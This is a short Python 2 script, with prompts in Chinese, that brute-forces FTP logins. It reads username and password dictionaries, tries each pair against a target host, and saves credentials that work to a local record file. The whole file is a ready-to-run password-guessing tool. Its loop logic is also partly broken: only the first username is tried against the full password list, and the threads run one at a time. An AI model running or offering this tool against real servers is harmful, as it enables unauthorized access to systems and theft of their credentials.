#!/usr/bin/env python
#-*-coding:utf-8-*-
import ftplib
import sys
import threading
import time
from ftplib import FTP


'''
z = zipfile.ZipFile('') , extractall
z.extractall(pwd)
'''


def ftp(user, pwd, host, start):

    try:

        ftp = ftplib.FTP()
        ftp.connect(host, 21, 9)
        ftp.login(user, pwd)
        ftp.retrlines('LIST')
        ftp.quit()
        print '\n[+] 破解成功，用户名：' + user + ' 密码：' + pwd + ' ip: ' + host

        fd = open('解密记录.txt', 'a')
        fd.write("\nftp://" + host + "\t用户名：" + user + "\t密码：" + pwd)
        fd.flush()
        fd.close()
        end = time.clock()
        print "破解用时 : %f s" % (end - start)
        print "密码破解记录已经保存到此文件夹“解密记录.txt”"
        return True, 'ftp password is ' + user + ':' + pwd

    except ftplib.all_errors:

        return


def main():

    host = raw_input("请输入ftp主机ip：")
    user = raw_input("请输入用户名字典路径，如：C:\\file.zip：")
    pass1 = raw_input("请输入密码字典路径，如：C:\\file.zip：")

    print '正在破解...'

    pwdall = open(pass1)
    userll = open(user)
    start = time.clock()

    for use in userll.readlines():

        user1 = use.strip('\n')
        for pwda in pwdall.readlines():
            pwd = pwda.strip('\n')

            t = threading.Thread(target=ftp, args=(user1, pwd, host, start))

            t.start()

            t.join()

if __name__ == '__main__':

    main()
